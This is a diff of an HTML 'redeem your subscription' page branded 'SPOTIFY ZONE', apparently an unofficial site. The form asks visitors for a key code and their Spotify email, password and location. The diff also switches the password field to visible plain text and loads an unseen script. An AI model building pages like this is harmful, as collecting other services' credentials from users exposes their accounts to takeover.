@@ -8,7 +8,7 @@
 </head>
 <body>
   <header class="header">
-    <div class="logo"> SPOTIFY <span class="highlight">ZONE</span></div>
+    <a href="index.html" class="logo"> SPOTIFY <span class="highlight">ZONE</span></a>
     <a href="https://discord.gg/wpB3QnrqXY" class="discord-button">
         <img src="https://cdn-icons-png.flaticon.com/512/4945/4945973.png" alt="Discord" class="discord-icon">
         Discord
@@ -16,14 +16,16 @@
   </header>
 
   <main class="main-content">
+    <div id="message" class="valid-message"></div>
+
     <section class="card">
       <h2>REDEEM YOUR SUBSCRIPTION</h2>
       <hr>
       <form>
         <input type="text" placeholder="XXXX-XXXX-XXXX-XXXX" required>
         <div class="credentials-label">Spotify Credentials</div>
-        <input type="text" placeholder="Username" required>
-        <input type="password" placeholder="Password" required>
+        <input type="text" placeholder="Email" required>
+        <input type="text" placeholder="Password" required>
         <input type="text" placeholder="Location" required>
         <button type="submit" class="submit-button">Submit</button>
       </form>
@@ -36,6 +38,5 @@
       Join our discord server for support
     </a>
   </footer>
-  
-</body>
+  <script src="script.js"></script></body>
 </html>
